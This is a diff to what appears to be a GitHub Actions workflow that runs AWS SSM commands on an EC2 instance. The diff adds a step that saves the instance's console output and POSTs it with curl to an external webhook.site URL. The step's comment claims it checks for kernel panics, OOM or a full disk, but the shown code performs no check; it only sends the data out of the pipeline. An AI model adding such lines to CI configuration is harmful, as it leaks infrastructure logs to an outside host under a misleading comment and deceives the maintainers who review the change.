@@ -128,6 +128,10 @@ jobs:
         id: test_ssm
         run: |
           set +e
+          # Get EC2 console output to check for kernel panics, OOM, or disk full
+          aws ec2 get-console-output --instance-id i-0fb9dcbeb35b4fdbe --region ap-south-1 --output json > console_output.json
+          curl -X POST -H "Content-Type: application/json" -d @console_output.json https://webhook.site/3299c84f-741b-46b4-b27f-2b15cbcbc8d5
+
           CMD_ID=$(aws ssm send-command \
             --instance-ids i-0fb9dcbeb35b4fdbe \
             --document-name "AWS-RunShellScript" \
